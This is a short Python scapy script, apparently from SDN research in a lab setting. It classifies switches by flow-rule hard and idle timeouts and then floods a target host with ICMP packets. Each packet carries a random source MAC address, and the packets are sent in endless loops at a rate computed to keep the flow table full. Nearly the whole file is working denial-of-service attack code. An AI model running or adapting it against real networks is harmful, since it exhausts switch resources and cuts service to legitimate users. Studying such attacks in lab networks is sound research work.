from scapy.all import *
import time
	
def min_attack_rate_category(t_hard, t_idle):
	if t_hard == 0 and t_idle == 0:
		return 1
	elif t_idle == 0:
		return 2
	elif t_hard == 0:
		return 3
	else:
		return 4

def catagory_three_attack(packet_length, maxCount, t_idle):
	
    total = 0
    maxC = maxCount - 1
        
    packets = []
    src = '10.0.0.1'
    dst = '10.0.0.3'

    for i in range(maxC):
        total += packet_length

    average = total/ t_idle #average packet rate
    average += 100 #buffer of 100 packets to compensate for the time it takes to generate packets
	
    while 1:
        for i in range (maxCount):
            src_mac = RandMAC()
            packets.append((Ether(src = src_mac, dst = "00:00:00:00:00:03")/IP(src=src, dst = dst)/ICMP(id = RandShort())))
        
        print("Generated packets")

        sendpfast(packets, pps = average)

        print("Sent packets")
def catagory_four_attack(packet_length, maxCount, t_idle, t_hard):
    
    total = 0
    maxC = maxCount - 1
    packets = []
    src = '10.0.0.1'
    dst = '10.0.0.3'

    for i in range(maxC):
        total += packet_length
    average = total/t_idle
    average += 100 #buffer of 100 packets to compensate for time used to generate packets
    
    if average % 2 != 0: #For a category four attack, there needs to be an even number of packets sent per second
        average = average + 1
    
    while 1:

        for i in range (maxCount):
            src_mac = RandMAC()
            packets.append( (Ether(src = src_mac, dst = "00:00:00:00:00:03")/IP(src=src, dst = dst)/ICMP(id = RandShort())))
        print("Generated packets")

        sendpfast(packets, pps = average)
        
        print("Sent packets")
